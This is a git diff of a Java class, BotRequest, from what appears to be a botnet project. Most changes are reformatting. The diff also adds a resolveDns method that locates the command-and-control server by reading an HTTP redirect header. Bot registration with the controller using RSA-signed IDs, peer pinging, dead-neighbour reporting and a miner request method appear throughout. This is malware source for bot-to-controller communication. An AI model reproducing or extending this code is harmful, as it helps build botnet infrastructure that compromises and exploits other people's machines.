@@ -1,6 +1,12 @@
 package cs.sii.network.request;
 
+import java.io.BufferedReader;
 import java.io.ByteArrayInputStream;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.MalformedURLException;
+import java.net.URL;
 import java.security.InvalidKeyException;
 import java.security.PublicKey;
 import java.security.SignatureException;
@@ -8,8 +14,16 @@ import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Iterator;
 import java.util.List;
+import java.util.Locale;
 import java.util.concurrent.Future;
 
+import org.apache.http.Header;
+import org.apache.http.HttpEntity;
+import org.apache.http.HttpResponse;
+import org.apache.http.client.HttpClient;
+import org.apache.http.client.config.RequestConfig;
+import org.apache.http.client.methods.HttpGet;
+import org.apache.http.impl.client.HttpClientBuilder;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.scheduling.annotation.Async;
 import org.springframework.scheduling.annotation.AsyncResult;
@@ -53,31 +67,32 @@ public class BotRequest {
 
 	// response = restTemplate.postForObject(url, obj, response.getClass());
 
-//	@Async
-//	public Future<String> pingUser(String ipBot) {
-//		Integer counter = 0;
-//		while (counter <= REQNUMBER) {
-//			try {
-//				System.out.println("\nRichiesta ad :" + ipBot);
-//				String response = restTemplate.postForObject("http://" + ipBot + "/bot/ping", null, String.class);
-//				return new AsyncResult<>(response);
-//			} catch (Exception e) {
-//				// e.printStackTrace();
-//				System.out.println("\nSono Morto: " + ipBot + " Causa: " + e.getMessage());
-//				counter++;
-//				// Aspetto prima della prossima richiesta
-//				try {
-//					Thread.sleep(WAIT_RANGE);
-//				} catch (InterruptedException ex) {
-//					System.err.println("Errore sleep" + ex);
-//					ex.printStackTrace();
-//				}
-//			}
-//		}
-//		return null;
-//	}
-	
-	
+	// @Async
+	// public Future<String> pingUser(String ipBot) {
+	// Integer counter = 0;
+	// while (counter <= REQNUMBER) {
+	// try {
+	// System.out.println("\nRichiesta ad :" + ipBot);
+	// String response = restTemplate.postForObject("http://" + ipBot +
+	// "/bot/ping", null, String.class);
+	// return new AsyncResult<>(response);
+	// } catch (Exception e) {
+	// // e.printStackTrace();
+	// System.out.println("\nSono Morto: " + ipBot + " Causa: " +
+	// e.getMessage());
+	// counter++;
+	// // Aspetto prima della prossima richiesta
+	// try {
+	// Thread.sleep(WAIT_RANGE);
+	// } catch (InterruptedException ex) {
+	// System.err.println("Errore sleep" + ex);
+	// ex.printStackTrace();
+	// }
+	// }
+	// }
+	// return null;
+	// }
+
 	@Async
 	public Future<Boolean> pingToBot(String ipBot) {
 		Integer counter = 0;
@@ -89,7 +104,7 @@ public class BotRequest {
 				return new AsyncResult<>(response);
 			} catch (Exception e) {
 				// e.printStackTrace();
-				System.out.println("Bot " + ipBot +" Morto a Causa: " + e.getMessage());
+				System.out.println("Bot " + ipBot + " Morto a Causa: " + e.getMessage());
 				counter++;
 				// Aspetto prima della prossima richiesta
 				try {
@@ -100,9 +115,8 @@ public class BotRequest {
 				}
 			}
 		}
-		return  new AsyncResult<>(false);
+		return new AsyncResult<>(false);
 	}
-	
 
 	@Async
 	public Future<Pairs<IP, Integer>> esempioRichiesta(String uriMiner) {
@@ -172,14 +186,14 @@ public class BotRequest {
 		}
 		return null;
 	}
-	
+
 	/**
 	 * @param iPCeC
 	 * @param ipBot
 	 * @param iDBot
 	 */
 
-	public ArrayList<Pairs<String, String>> sendDeadNeighToCeC(String iPCeC,String myIdBot,List<IP> deadBotList) {
+	public ArrayList<Pairs<String, String>> sendDeadNeighToCeC(String iPCeC, String myIdBot, List<IP> deadBotList) {
 		ArrayList<Pairs<String, String>> result = new ArrayList<Pairs<String, String>>();
 		Integer counter = 0;
 		String encryptData = "";
@@ -189,10 +203,10 @@ public class BotRequest {
 		List<String> data = new ArrayList<String>();
 
 		data.add(encryptData);
-		for (IP obj: deadBotList) {
+		for (IP obj : deadBotList) {
 			data.add(obj.toString());
 		}
-		
+
 		while (counter <= REQNUMBER) {
 			try {
 				String url = HTTPS + iPCeC + PORT + "/cec/neighbours/sync";
@@ -217,15 +231,13 @@ public class BotRequest {
 		return null;
 	}
 
-	
-	
 	// da valutare se devono essere asincroni
 	public Pairs<String, String> getIpCeCFromDnsServer(String dnsUrl) {
 		Pairs<String, String> cec = new Pairs<String, String>();
 		while (true) {
 			try {
 				System.out.println("url request " + dnsUrl);
-				String url = HTTP + dnsUrl;
+				String url = resolveDns(dnsUrl);
 				// Type type=new TypeToken<Pairs<IP,String>>(){}.getType();
 				// cec = restTemplate.getForObject(url,Pairs.class);
 				cec = restTemplate.postForObject(url, null, cec.getClass());
@@ -271,17 +283,15 @@ public class BotRequest {
 		Pairs<Long, Integer> response = new Pairs<>();
 		Integer counter = 0;
 
-		
-		String signId=null;
+		String signId = null;
 		String data = null;
 		try {
 			signId = pki.signMessageRSA(idBot);
-			data=idBot+"<CS>"+signId;
+			data = idBot + "<CS>" + signId;
 		} catch (InvalidKeyException | SignatureException e1) {
 			e1.printStackTrace();
 		}
-		
-			
+
 		while (counter < REQNUMBER) {
 			try {
 				String url = HTTPS + ipCeC + PORT + "/cec/welcome";
@@ -561,10 +571,10 @@ public class BotRequest {
 	 * @param dest
 	 * @param hashMac
 	 * @param pk
-	 * @return 
+	 * @return
 	 * @return
 	 */
-	
+
 	public Boolean getResponseFromBot(String idBot, IP dest, String hashMac, PublicKey pk) {
 		Integer counter = 0;
 		Boolean response = false;
@@ -593,6 +603,26 @@ public class BotRequest {
 			}
 		}
 		return response;
+	}
+
+	public String resolveDns(String dnsUrl) {
+		String url = "http://" + dnsUrl;
+		String rediret = null;
+
+		HttpURLConnection connection = null;
+		try {
+			
+				URL uri;
+				uri = new URL(url);
+				connection = (HttpURLConnection) uri.openConnection();
+				connection.setInstanceFollowRedirects(false);
+				rediret = connection.getHeaderField("Location");
+				//System.out.println("risultato " + rediret);
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+		return rediret;
 	}
 
 	public String askMyIpToAmazon() {
@@ -630,7 +660,15 @@ public class BotRequest {
 	//
 	// HttpResponse response;
 	// response = client.execute(request);
+	// HttpEntity x = response.getEntity();
+	// System.out.println("x "+x.toString());
+	//// for (int i = 0; i < x.length; i++) {
+	//// System.out.println("Header "+i+" "+x[i].getName() +"
+	// "+x[i].getValue());
+	//// }
+	////
 	// BufferedReader rd;
+	//
 	// rd = new BufferedReader(new
 	// InputStreamReader(response.getEntity().getContent()));
 	// StringBuffer result = new StringBuffer();
